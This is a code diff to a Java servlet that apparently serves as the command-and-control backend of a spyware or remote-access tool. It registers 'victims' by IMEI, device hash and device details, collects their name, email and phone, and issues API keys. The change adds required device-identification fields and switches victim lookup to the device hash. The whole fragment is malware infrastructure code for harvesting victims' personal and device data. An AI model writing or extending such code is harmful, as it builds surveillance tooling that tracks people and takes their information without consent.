@@ -26,7 +26,12 @@ import java.util.Random;
 @WebServlet(name = "IN Servlet", urlPatterns = {BaseServlet.VERSION_CODE + "/in"})
 public class INServlet extends BaseServlet {
 
-    private static final String[] requiredParams = {Victims.COLUMN_IMEI};
+    private static final String[] requiredParams = {
+            Victims.COLUMN_IMEI,
+            Victims.COLUMN_DEVICE_NAME,
+            Victims.COLUMN_DEVICE_HASH,
+            Victims.COLUMN_OTHER_DEVICE_INFO
+    };
     private static final int API_KEY_LENGTH = 10;
 
     protected void doPost(HttpServletRequest servletRequest, HttpServletResponse servletResponse) throws ServletException, IOException {
@@ -40,12 +45,16 @@ public class INServlet extends BaseServlet {
             final Request request = new Request(servletRequest, requiredParams);
 
             final String imei = request.getStringParameter(Victims.COLUMN_IMEI);
+            final String deviceName = request.getStringParameter(Victims.COLUMN_DEVICE_NAME);
+            final String deviceHash = request.getStringParameter(Victims.COLUMN_DEVICE_HASH);
+            final String otherDeviceInfo = request.getStringParameter(Victims.COLUMN_OTHER_DEVICE_INFO);
+
             final Victims victimsTable = Victims.getInstance();
-            final Victim oldVictim = victimsTable.get(Victims.COLUMN_IMEI, imei);
+            final Victim oldVictim = victimsTable.get(Victims.COLUMN_DEVICE_HASH, deviceHash);
 
             final String apiKey;
 
-            //Victim doesn't exists, so create new account
+            //Victim's details
             final String name = request.getStringParameter(Victims.COLUMN_NAME);
             final String email = request.getStringParameter(Victims.COLUMN_EMAIL);
             final String phone = request.getStringParameter(Victims.COLUMN_PHONE);
